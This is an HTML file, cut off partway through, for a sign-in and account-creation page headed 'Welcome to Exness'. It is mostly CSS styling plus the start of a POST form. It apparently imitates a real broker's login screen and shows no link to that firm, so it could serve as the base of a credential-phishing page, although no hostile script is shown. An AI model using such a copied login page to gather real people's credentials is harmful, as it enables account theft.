<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Exness</title>
    <style>
        /* Add the CSS styling provided earlier */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f9f9f9;
        }

        .container {
            background-color: #fff;
            width: 360px;
            padding: 20px 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h1 {
            font-size: 22px;
            color: #333;
            margin-bottom: 20px;
        }

        .tabs {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
            border-bottom: 2px solid #eaeaea;
        }

        .tab {
            font-size: 16px;
            padding: 10px 15px;
            cursor: pointer;
            color: #999;
        }

        .tab.active {
            font-weight: bold;
            color: #000;
            border-bottom: 2px solid #000;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        input {
            padding: 12px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 5px;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #000;
        }

        button {
            background-color: #FFD700;
            border: none;
            padding: 12px;
            border-radius: 5px;
            font-size: 16px;
            color: #000;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #FFC300;
        }

        .or-sign-in {
            font-size: 14px;
            color: #777;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to Exness</h1>
        <div class="tabs">
            <div class="tab active">Sign in</div>
            <div class="tab">Create an account</div>
        </div>
        <form action="" method="POST">
            <input type="email" name="email
